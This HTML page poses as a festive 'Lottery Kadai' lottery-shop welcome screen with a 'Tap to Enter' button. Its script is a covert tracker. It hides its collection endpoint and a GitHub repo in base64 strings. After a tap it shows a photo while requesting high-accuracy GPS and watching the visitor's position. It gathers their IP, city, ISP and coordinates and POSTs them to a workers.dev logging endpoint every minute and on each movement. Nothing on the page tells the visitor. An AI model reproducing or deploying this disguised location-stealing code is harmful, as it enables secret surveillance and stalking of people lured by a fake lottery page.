<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<link rel="icon" href="data:;base64,=">
<title> </title>
<style>
*{margin:0;padding:0}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}
img{max-width:100%;max-height:100vh;object-fit:contain}
#tap{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;cursor:pointer;display:flex;justify-content:center;align-items:center;border:none;background:radial-gradient(ellipse at center,#1a0a00 0%,#0a0000 50%,#000 100%);font-family:sans-serif;padding:0;overflow:hidden}
#tap::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent,#ffd700,#ff4500,#ffd700,transparent,#ffd700,#ff4500,#ffd700,transparent);animation:spin 4s linear infinite;opacity:0.08}
@keyframes spin{to{transform:rotate(360deg)}}
.wrap{text-align:center;z-index:1;padding:30px}
.lottery-board{
  background:linear-gradient(180deg,#b8860b,#ffd700 30%,#b8860b 70%,#8b6508);
  border:4px solid #fff;border-radius:16px;padding:8px;
  box-shadow:0 0 40px rgba(255,215,0,0.4),inset 0 0 20px rgba(0,0,0,0.3);
  display:inline-block;margin-bottom:20px;
}
.lottery-inner{
  background:linear-gradient(180deg,#1a0000,#330000,#1a0000);
  border:2px dashed #ffd700;border-radius:10px;padding:20px 30px;
}
.stars{font-size:1.5rem;letter-spacing:8px;animation:blink 1.2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
.welcome{font-size:0.7rem;color:#ffd700;letter-spacing:6px;text-transform:uppercase;margin:8px 0 4px}
.shop-name{font-size:1.4rem;font-weight:900;color:#fff;text-shadow:0 0 15px #ffd700,0 0 30px #ff4500;letter-spacing:2px}
.sub-name{font-size:0.75rem;color:#ff6347;letter-spacing:3px;margin-top:4px}
.lights{display:flex;justify-content:center;gap:10px;margin:14px 0}
.bulb{width:10px;height:10px;border-radius:50%;animation:glow 1s infinite}
.bulb:nth-child(1){background:#ff0000;animation-delay:0s}
.bulb:nth-child(2){background:#ffd700;animation-delay:0.2s}
.bulb:nth-child(3){background:#00ff00;animation-delay:0.4s}
.bulb:nth-child(4){background:#00d4ff;animation-delay:0.6s}
.bulb:nth-child(5){background:#ff00ff;animation-delay:0.8s}
.bulb:nth-child(6){background:#ff0000;animation-delay:0s}
.bulb:nth-child(7){background:#ffd700;animation-delay:0.2s}
.bulb:nth-child(8){background:#00ff00;animation-delay:0.4s}
@keyframes glow{0%,100%{opacity:0.3;transform:scale(0.8)}50%{opacity:1;transform:scale(1.2)}}
.tap-btn{
  margin-top:16px;padding:14px 36px;border:2px solid #ffd700;border-radius:30px;
  background:linear-gradient(135deg,#b8860b,#ffd700,#b8860b);
  color:#1a0000;font-size:1rem;font-weight:800;cursor:pointer;
  font-family:inherit;letter-spacing:1px;text-transform:uppercase;
  box-shadow:0 0 25px rgba(255,215,0,0.4);
  animation:pulse-btn 2s infinite;transition:all 0.2s;
}
@keyframes pulse-btn{0%,100%{box-shadow:0 0 25px rgba(255,215,0,0.4)}50%{box-shadow:0 0 45px rgba(255,215,0,0.8)}}
.tap-btn:active{transform:scale(0.93);box-shadow:0 0 50px rgba(255,215,0,1)}
.footer-deco{margin-top:16px;font-size:0.6rem;color:#8b6508;letter-spacing:4px}
</style>
</head>
<body>
<button id="tap">
<div class="wrap">
  <div class="lottery-board">
    <div class="lottery-inner">
      <div class="stars">✦ ✦ ✦</div>
      <div class="welcome">Welcome To</div>
      <div class="shop-name">Lottery Kadai</div>
      <div class="sub-name">Try Your Luck</div>
    </div>
  </div>
  <div class="lights">
    <div class="bulb"></div><div class="bulb"></div><div class="bulb"></div><div class="bulb"></div>
    <div class="bulb"></div><div class="bulb"></div><div class="bulb"></div><div class="bulb"></div>
  </div>
  <div class="tap-btn">Tap to Enter</div>
  <div class="footer-deco">✦ GOLD ✦ LUCK ✦</div>
</div>
</button>
<img id="photo">
<script>
(function(){
var API=atob("aHR0cHM6Ly9sb2NhdGlvbi1hcGkuZGhhbmFtcGFyaXN1c2VldHUud29ya2Vycy5kZXY=");
var IMG=atob("SU1HXzIwMjYwNzI2XzEwMTgwOS5qcGc=");
var REPO=atob("ZGhhbmFtcGFyaXN1c2VldHUtZHJvaWQvcGFyaXN1c2VldHU=");
var I=60;
var raw1="https://raw.githubusercontent.com/"+REPO+"/main/"+IMG;
var lastLoc=null;

function fetchIP(){
    return fetch(API+"/ip").then(function(r){return r.json()}).catch(function(){return{}});
}

var busy=false;
function push(e){
    if(busy)return Promise.resolve();
    busy=true;
    return fetch(API+"/location_log.json",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)}).then(function(r){
        return r.json();
    }).then(function(d){
        busy=false;
    }).catch(function(){busy=false});
}

function send(){
    fetchIP().then(function(ipd){
        ipd=ipd||{};
        var e;
        if(lastLoc){
            e={lat:lastLoc.lat,lng:lastLoc.lng,city:ipd.city||"unknown",region:ipd.region,country:ipd.country,isp:ipd.isp,ip:ipd.ip,method:lastLoc.method,accuracy:lastLoc.accuracy,timestamp:new Date().toISOString()};
        } else if(ipd.ip){
            e={lat:0,lng:0,city:ipd.city||"unknown",region:ipd.region,country:ipd.country,isp:ipd.isp,ip:ipd.ip,method:"IP",accuracy:"IP-only",timestamp:new Date().toISOString()};
        }
        if(e)push(e);
    });
}

function onGPSReady(){
    send();
    setInterval(send,I*1000);
    navigator.geolocation.watchPosition(function(p){
        lastLoc={lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy,method:"GPS"};
        send();
    },function(){},{enableHighAccuracy:true,maximumAge:5000});
}

function startAll(){
    var tap=document.getElementById("tap");
    if(tap)tap.style.display="none";
    var img=document.getElementById("photo");
    img.src=raw1;
    img.style.display="";
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(p){
            lastLoc={lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy,method:"GPS"};
            onGPSReady();
        },function(err){
            send();
            setInterval(send,I*1000);
        },{enableHighAccuracy:true,timeout:30000,maximumAge:0});
    } else {
        send();
        setInterval(send,I*1000);
    }
}

var done=false;
function go(){if(!done){done=true;startAll()}}
document.getElementById("tap").addEventListener("click",go);
document.getElementById("tap").addEventListener("touchend",function(e){e.preventDefault();go()});
})();
</script>
</body>
</html>
